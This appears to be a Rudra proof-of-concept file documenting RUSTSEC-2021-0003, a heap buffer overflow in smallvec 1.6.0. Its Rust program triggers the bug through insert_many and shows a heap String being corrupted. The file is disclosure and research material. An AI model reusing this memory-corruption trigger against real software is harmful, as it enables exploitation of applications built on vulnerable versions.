/*!
```rudra-poc
[target]
crate = "smallvec"
version = "1.6.0"

[test]
analyzers = ["manual", "PanicSafety"]

[report]
issue_url = "https://github.com/servo/rust-smallvec/issues/252"
issue_date = 2021-01-08
rustsec_url = "https://github.com/RustSec/advisory-db/pull/552"
rustsec_id = "RUSTSEC-2021-0003"
```
!*/
#![forbid(unsafe_code)]

use smallvec::SmallVec;

fn main() {
    let mut v: SmallVec<[u8; 0]> = SmallVec::new();

    // Spill on heap
    v.push(123);

    // Allocate string on heap
    let s = String::from("Hello!");
    println!("{}", s);

    // Prepare an iterator with small lower bound
    let mut iter = (0u8..=255).filter(|n| n % 2 == 0);
    assert_eq!(iter.size_hint().0, 0);

    // Triggering the bug
    v.insert_many(0, iter);

    // Uh oh, heap overflow made smallvec and string to overlap
    assert!(v.as_ptr_range().contains(&s.as_ptr()));

    // String is corrupted
    println!("{}", s);
}
